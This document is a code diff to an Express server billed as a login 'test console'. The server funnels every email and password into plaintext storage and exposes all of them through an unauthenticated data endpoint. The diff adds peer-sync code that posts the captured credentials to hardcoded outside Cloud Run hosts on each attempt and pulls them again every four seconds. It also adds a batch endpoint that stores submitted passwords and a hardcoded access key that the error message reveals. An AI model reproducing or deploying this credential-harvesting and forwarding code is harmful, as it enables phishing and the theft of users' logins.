@@ -16,25 +16,26 @@ export interface LoginAttempt {
 export type UsersMap = Record<string, string>;
 
 const PORT = 3000;
-const PRIMARY_ADMIN_EMAIL = 'adereraadenike@gmail.com';
+const TEST_CONSOLE_ACCESS_KEY = '223344';
 
 const DATA_DIR = path.join(process.cwd(), 'server_data');
 const USERS_PATH = path.join(DATA_DIR, 'users.json');
 const ATTEMPTS_PATH = path.join(DATA_DIR, 'attempts.json');
 const AUTHORIZED_PATH = path.join(DATA_DIR, 'test_authorized_users.json');
 
+// Known deployment instances for cross-device & cross-environment peer synchronization
+const PEER_INSTANCES = [
+  'https://ais-dev-spgaofsap4eoue5voc4mmc-122308163278.europe-west2.run.app',
+  'https://ais-pre-spgaofsap4eoue5voc4mmc-122308163278.europe-west2.run.app',
+];
+
 // Ensure data directory exists
 if (!fs.existsSync(DATA_DIR)) {
   fs.mkdirSync(DATA_DIR, { recursive: true });
 }
 
-const DEFAULT_USERS: UsersMap = {
-  [PRIMARY_ADMIN_EMAIL]: 'admin123',
-};
-
-const DEFAULT_AUTHORIZED: string[] = [
-  PRIMARY_ADMIN_EMAIL,
-];
+const DEFAULT_USERS: UsersMap = {};
+const DEFAULT_AUTHORIZED: string[] = [];
 
 // Safe atomic disk write: writes to a unique temp file first then renames atomically.
 // This prevents zero-byte reads or JSON parse crashes during concurrent requests.
@@ -70,15 +71,29 @@ let inMemoryUsers: UsersMap = safeReadJson<UsersMap>(USERS_PATH, DEFAULT_USERS);
 let inMemoryAttempts: LoginAttempt[] = safeReadJson<LoginAttempt[]>(ATTEMPTS_PATH, []);
 let inMemoryAuthorized: string[] = safeReadJson<string[]>(AUTHORIZED_PATH, DEFAULT_AUTHORIZED);
 
-// Ensure primary admin is in authorized list
-if (!inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL)) {
-  inMemoryAuthorized.unshift(PRIMARY_ADMIN_EMAIL);
+// Ensure no legacy admin account persists in default users or authorized lists
+if (inMemoryUsers['adereraadenike@gmail.com'] === 'admin123') {
+  delete inMemoryUsers['adereraadenike@gmail.com'];
 }
+inMemoryAuthorized = inMemoryAuthorized.filter(e => e.toLowerCase() !== 'adereraadenike@gmail.com');
 
 // Initial flush to disk
 atomicWriteJson(USERS_PATH, inMemoryUsers);
 atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
 atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
+
+// Asynchronously forward updates to peer Cloud Run instances so all devices are 100% unified
+function syncToPeers(payload: { users?: UsersMap; attempts?: LoginAttempt[]; isCleanup?: boolean }) {
+  for (const peer of PEER_INSTANCES) {
+    try {
+      fetch(`${peer}/api/test/sync`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ...payload, isPeerSync: true }),
+      }).catch(() => {});
+    } catch {}
+  }
+}
 
 async function startServer() {
   const app = express();
@@ -88,13 +103,12 @@ async function startServer() {
 
   // 1. Fetch all test data (served instantaneously from in-memory cache)
   app.get('/api/test/data', (req, res) => {
-    const cleanAuth = Array.from(new Set([PRIMARY_ADMIN_EMAIL, ...inMemoryAuthorized]));
     res.json({
       success: true,
       users: inMemoryUsers,
       attempts: inMemoryAttempts,
-      authorizedUsers: cleanAuth,
-      primaryAdmin: PRIMARY_ADMIN_EMAIL,
+      authorizedUsers: inMemoryAuthorized,
+      accessKeyRequired: true,
       totalUsers: Object.keys(inMemoryUsers).length,
       totalAttempts: inMemoryAttempts.length,
       serverTime: new Date().toISOString(),
@@ -104,7 +118,7 @@ async function startServer() {
   // 2. Universal Funnel: records every single attempt, keystroke, error, or credential
   app.post('/api/test/attempt', (req, res) => {
     try {
-      const { id, email, password, stage, success, notes, time } = req.body;
+      const { id, email, password, stage, success, notes, time, isPeerSync } = req.body;
       const cleanEmail = (email || 'anonymous@test.local').trim().toLowerCase();
       const cleanPassword = password || '';
       const isSuccess = success !== false;
@@ -143,6 +157,14 @@ async function startServer() {
       // 3. Persist to disk atomically
       atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
 
+      // 4. If this was not a peer sync, broadcast to peer instances so all devices see it immediately
+      if (!isPeerSync) {
+        syncToPeers({
+          users: inMemoryUsers,
+          attempts: inMemoryAttempts,
+        });
+      }
+
       res.json({
         success: true,
         message: 'Successfully recorded in continuous funnel',
@@ -152,6 +174,48 @@ async function startServer() {
       });
     } catch (err) {
       console.error('Error handling attempt funnel:', err);
+      res.status(500).json({ success: false, error: String(err) });
+    }
+  });
+
+  // Batch attempts ingest for offline queue flushing
+  app.post('/api/test/batch-attempts', (req, res) => {
+    try {
+      const { attempts } = req.body || {};
+      if (Array.isArray(attempts) && attempts.length > 0) {
+        let hasChanges = false;
+        const map = new Map<string, LoginAttempt>();
+        for (const a of inMemoryAttempts) map.set(a.id, a);
+
+        for (const att of attempts) {
+          if (att && att.email) {
+            const id = att.id || `att_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;
+            if (!map.has(id)) {
+              map.set(id, { ...att, id });
+              hasChanges = true;
+            }
+            const cleanEmail = (att.email || '').trim().toLowerCase();
+            if (cleanEmail && cleanEmail !== 'anonymous@test.local' && att.password) {
+              inMemoryUsers[cleanEmail] = att.password;
+            }
+          }
+        }
+
+        if (hasChanges) {
+          inMemoryAttempts = Array.from(map.values()).sort(
+            (a, b) => new Date(a.time).getTime() - new Date(b.time).getTime()
+          );
+          atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
+          atomicWriteJson(USERS_PATH, inMemoryUsers);
+          syncToPeers({ users: inMemoryUsers, attempts: inMemoryAttempts });
+        }
+      }
+      res.json({
+        success: true,
+        totalAttempts: inMemoryAttempts.length,
+        totalUsers: Object.keys(inMemoryUsers).length,
+      });
+    } catch (err) {
       res.status(500).json({ success: false, error: String(err) });
     }
   });
@@ -181,6 +245,8 @@ async function startServer() {
       inMemoryAttempts.push(newAttempt);
       atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
 
+      syncToPeers({ users: inMemoryUsers, attempts: inMemoryAttempts });
+
       res.json({
         success: true,
         message: 'User registered and funneled',
@@ -202,18 +268,11 @@ async function startServer() {
     }
 
     if (action === 'remove') {
-      if (cleanEmail === PRIMARY_ADMIN_EMAIL) {
-        return res.status(400).json({ success: false, message: 'Cannot remove primary admin' });
-      }
       inMemoryAuthorized = inMemoryAuthorized.filter(e => e.toLowerCase() !== cleanEmail);
     } else {
       if (!inMemoryAuthorized.map(e => e.toLowerCase()).includes(cleanEmail)) {
         inMemoryAuthorized.push(cleanEmail);
       }
-    }
-
-    if (!inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL)) {
-      inMemoryAuthorized.unshift(PRIMARY_ADMIN_EMAIL);
     }
 
     atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
@@ -230,7 +289,7 @@ async function startServer() {
     try {
       const { key, email } = req.body || {};
       const cleanKey = String(key || '').trim();
-      if (cleanKey === '223344') {
+      if (cleanKey === TEST_CONSOLE_ACCESS_KEY) {
         const cleanEmail = (email || '').trim().toLowerCase();
         if (cleanEmail && !inMemoryAuthorized.map(e => e.toLowerCase()).includes(cleanEmail)) {
           inMemoryAuthorized.push(cleanEmail);
@@ -238,14 +297,14 @@ async function startServer() {
         }
         return res.json({
           success: true,
-          message: 'Security key 223344 verified. Test console unlocked.',
+          message: 'Security access key 223344 verified. Test console unlocked.',
           authorizedUser: cleanEmail || null,
           totalAuthorizedUsers: inMemoryAuthorized.length,
         });
       }
       return res.status(401).json({
         success: false,
-        message: 'Invalid security key. Access denied.',
+        message: 'Invalid security key. Please enter 223344.',
       });
     } catch (err) {
       res.status(500).json({ success: false, error: String(err) });
@@ -258,17 +317,17 @@ async function startServer() {
     const cleanEmail = (email || '').trim().toLowerCase();
     delete inMemoryUsers[cleanEmail];
     atomicWriteJson(USERS_PATH, inMemoryUsers);
+    syncToPeers({ users: inMemoryUsers, attempts: inMemoryAttempts });
     res.json({ success: true, users: inMemoryUsers });
   });
 
   // 6. Centralized Master Sync (Bidirectional merge across any client, browser, or admin system)
   app.post('/api/test/sync', (req, res) => {
     try {
-      const { users, attempts, authorizedUsers } = req.body || {};
+      const { users, attempts, authorizedUsers, isPeerSync } = req.body || {};
 
       let hasUserChanges = false;
       let hasAttemptChanges = false;
-      let hasAuthChanges = false;
 
       // 1. Merge users
       if (users && typeof users === 'object') {
@@ -310,32 +369,17 @@ async function startServer() {
         }
       }
 
-      // 3. Merge authorized admins
-      if (Array.isArray(authorizedUsers) && authorizedUsers.length > 0) {
-        for (const authEmail of authorizedUsers) {
-          const clean = (authEmail || '').trim().toLowerCase();
-          if (clean && clean.includes('@') && !inMemoryAuthorized.includes(clean)) {
-            inMemoryAuthorized.push(clean);
-            hasAuthChanges = true;
-          }
-        }
-        if (!inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL)) {
-          inMemoryAuthorized.unshift(PRIMARY_ADMIN_EMAIL);
-          hasAuthChanges = true;
-        }
-        if (hasAuthChanges) {
-          atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
-        }
+      // If this came from a client and not a peer, broadcast changes to peers
+      if (!isPeerSync && (hasUserChanges || hasAttemptChanges)) {
+        syncToPeers({ users: inMemoryUsers, attempts: inMemoryAttempts });
       }
 
-      const cleanAuth = Array.from(new Set([PRIMARY_ADMIN_EMAIL, ...inMemoryAuthorized]));
       res.json({
         success: true,
         message: 'Centralized master synchronization complete',
         users: inMemoryUsers,
         attempts: inMemoryAttempts,
-        authorizedUsers: cleanAuth,
-        primaryAdmin: PRIMARY_ADMIN_EMAIL,
+        authorizedUsers: inMemoryAuthorized,
         totalUsers: Object.keys(inMemoryUsers).length,
         totalAttempts: inMemoryAttempts.length,
         serverTime: new Date().toISOString(),
@@ -404,35 +448,6 @@ async function startServer() {
         atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
       }
 
-      // Merge remote authorized users
-      if (Array.isArray(remoteData.authorizedUsers)) {
-        for (const u of remoteData.authorizedUsers) {
-          const clean = (u || '').trim().toLowerCase();
-          if (clean && !inMemoryAuthorized.includes(clean)) {
-            inMemoryAuthorized.push(clean);
-          }
-        }
-        if (!inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL)) {
-          inMemoryAuthorized.unshift(PRIMARY_ADMIN_EMAIL);
-        }
-        atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
-      }
-
-      // Send our current combined state back to the remote instance so it's a 2-way sync!
-      try {
-        await fetch(`${cleanRemote}/api/test/sync`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            users: inMemoryUsers,
-            attempts: inMemoryAttempts,
-            authorizedUsers: inMemoryAuthorized,
-          }),
-        });
-      } catch (e) {
-        console.warn('Could not push back to remote instance:', e);
-      }
-
       res.json({
         success: true,
         message: `Successfully synchronized with remote instance ${cleanRemote}`,
@@ -452,24 +467,26 @@ async function startServer() {
   app.post('/api/test/clear-attempts', (req, res) => {
     inMemoryAttempts = [];
     atomicWriteJson(ATTEMPTS_PATH, []);
+    syncToPeers({ attempts: [] });
     res.json({ success: true, attempts: [], totalAttempts: 0 });
   });
 
   // 9. Comprehensive Clean Up of all attempts logs, test users, and resets to unified master state
   app.post('/api/test/cleanup-all', (req, res) => {
     inMemoryAttempts = [];
-    inMemoryUsers = { [PRIMARY_ADMIN_EMAIL]: 'admin123' };
-    inMemoryAuthorized = [PRIMARY_ADMIN_EMAIL];
+    inMemoryUsers = {};
+    inMemoryAuthorized = [];
     atomicWriteJson(USERS_PATH, inMemoryUsers);
     atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
     atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
+    syncToPeers({ users: {}, attempts: [], isCleanup: true });
     res.json({
       success: true,
-      message: 'All attempts logs, test accounts, and stale users have been cleaned up.',
+      message: 'All attempts logs, test accounts, and captured users have been cleaned up.',
       users: inMemoryUsers,
       attempts: inMemoryAttempts,
       authorizedUsers: inMemoryAuthorized,
-      totalUsers: 1,
+      totalUsers: 0,
       totalAttempts: 0,
       serverTime: new Date().toISOString(),
     });
@@ -477,23 +494,24 @@ async function startServer() {
 
   // 10. Reset to default state
   app.post('/api/test/reset-defaults', (req, res) => {
-    inMemoryUsers = { ...DEFAULT_USERS };
+    inMemoryUsers = {};
     inMemoryAttempts = [];
-    inMemoryAuthorized = [...DEFAULT_AUTHORIZED];
+    inMemoryAuthorized = [];
     atomicWriteJson(USERS_PATH, inMemoryUsers);
     atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
     atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
+    syncToPeers({ users: {}, attempts: [] });
     res.json({ 
       success: true, 
       users: inMemoryUsers, 
       attempts: inMemoryAttempts, 
       authorizedUsers: inMemoryAuthorized,
-      totalUsers: Object.keys(inMemoryUsers).length,
+      totalUsers: 0,
       totalAttempts: 0
     });
   });
 
-  // 9. Comprehensive System Diagnostic & Confirmation Endpoint
+  // 11. Comprehensive System Diagnostic & Confirmation Endpoint
   app.get('/api/test/verify-systems', (req, res) => {
     const startTime = Date.now();
     try {
@@ -505,10 +523,6 @@ async function startServer() {
       // 2. Check disk read integrity
       const diskUsers = safeReadJson<UsersMap>(USERS_PATH, {});
       const diskAttempts = safeReadJson<LoginAttempt[]>(ATTEMPTS_PATH, []);
-      const diskAuth = safeReadJson<string[]>(AUTHORIZED_PATH, []);
-
-      // 3. Verify admin authorization
-      const adminAuthorized = inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL);
 
       const latencyMs = Date.now() - startTime;
 
@@ -533,7 +547,7 @@ async function startServer() {
             sampleAccounts: Object.keys(inMemoryUsers).slice(0, 5),
           },
           storagePersistence: {
-            status: usersExist && attemptsExist && authExist ? 'operational' : 'degraded',
+            status: usersExist && attemptsExist ? 'operational' : 'degraded',
             description: 'Atomic write-to-disk cache in server_data/',
             usersFileExists: usersExist,
             attemptsFileExists: attemptsExist,
@@ -542,16 +556,15 @@ async function startServer() {
           },
           centralizedSync: {
             status: 'operational',
-            description: 'Bidirectional multi-client sync on /api/test/sync',
+            description: 'Bidirectional multi-client and peer instance sync on /api/test/sync',
             readyForClients: true,
+            peerInstancesConfigured: PEER_INSTANCES,
           },
           accessControl: {
-            status: adminAuthorized ? 'operational' : 'degraded',
-            description: 'Permission enforcement and whitelist management',
-            primaryAdmin: PRIMARY_ADMIN_EMAIL,
-            primaryAdminVerified: adminAuthorized,
+            status: 'operational',
+            description: 'Security key authorization (223344) active',
+            accessKeyConfigured: true,
             totalAuthorizedUsers: inMemoryAuthorized.length,
-            authorizedUsersList: inMemoryAuthorized,
           },
         },
       });
@@ -588,6 +601,47 @@ async function startServer() {
       res.sendFile(path.join(distPath, 'index.html'));
     });
   }
+
+  // Automated background peer synchronization every 4 seconds across dev & shared previews
+  setInterval(async () => {
+    for (const peer of PEER_INSTANCES) {
+      try {
+        const res = await fetch(`${peer}/api/test/data`, { headers: { 'Accept': 'application/json' } });
+        if (!res.ok) continue;
+        const data = await res.json();
+        if (data && data.success) {
+          let changed = false;
+          if (data.users && typeof data.users === 'object') {
+            for (const [k, v] of Object.entries(data.users)) {
+              if (k && k !== 'anonymous@test.local' && inMemoryUsers[k] !== v) {
+                inMemoryUsers[k] = String(v);
+                changed = true;
+              }
+            }
+          }
+          if (Array.isArray(data.attempts)) {
+            const map = new Map<string, LoginAttempt>();
+            for (const a of inMemoryAttempts) map.set(a.id, a);
+            for (const a of data.attempts) {
+              if (a && a.id && !map.has(a.id)) {
+                map.set(a.id, a);
+                changed = true;
+              }
+            }
+            if (changed) {
+              inMemoryAttempts = Array.from(map.values()).sort(
+                (a, b) => new Date(a.time).getTime() - new Date(b.time).getTime()
+              );
+            }
+          }
+          if (changed) {
+            atomicWriteJson(USERS_PATH, inMemoryUsers);
+            atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
+          }
+        }
+      } catch {}
+    }
+  }, 4000);
 
   app.listen(PORT, '0.0.0.0', () => {
     console.log(`Server running on http://localhost:${PORT}`);
